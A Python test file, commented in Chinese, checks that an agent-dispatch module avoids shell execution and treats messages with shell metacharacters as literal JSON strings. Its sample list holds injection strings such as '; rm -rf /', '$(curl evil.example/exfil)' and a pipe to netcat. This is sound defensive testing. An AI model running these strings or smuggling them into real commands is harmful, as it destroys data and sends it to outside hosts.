"""测试 tianshu 安全 dispatch（P0.6 G-11）。

验证：
1. dispatch_safe.py 不含 shell=True / os.system / subprocess.Popen
2. message 含 shell 元字符时，作为字面字符串传输（不触发注入）
"""

from __future__ import annotations

import inspect
import importlib.util
from pathlib import Path

# adapters/tianshu-concept 含 hyphen，不是合法包名；用 spec 从文件加载
_spec = importlib.util.spec_from_file_location(
    "dispatch_safe",
    Path(__file__).parent / "dispatch_safe.py",
)
assert _spec is not None and _spec.loader is not None
mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(mod)


def test_no_shell_interpreter() -> None:
    """dispatch_to_agent 函数源码不得包含任何 shell 解释器调用。"""
    src = inspect.getsource(mod.dispatch_to_agent)
    for forbidden in ("shell=True", "os.system", "subprocess.Popen", "os.popen"):
        assert forbidden not in src, f"found forbidden pattern: {forbidden}"


def test_self_check_passes() -> None:
    assert mod._self_check_no_shell() is True


def test_message_with_shell_metachars_is_literal() -> None:
    """含 ``; rm -rf /`` 的 message 只作为 JSON 字段，不会被解释。"""
    evil_messages = [
        "; rm -rf /",
        "$(curl evil.example/exfil)",
        "`whoami`",
        "foo && bar",
        "foo | nc evil 4444",
        "foo; foo\x00bar",
    ]
    for msg in evil_messages:
        # 这些字符串都能被 json.dumps 正常编码（作为字面值）
        import json
        encoded = json.dumps({"goal": msg})
        # 反编码后应与原文相等
        assert json.loads(encoded)["goal"] == msg
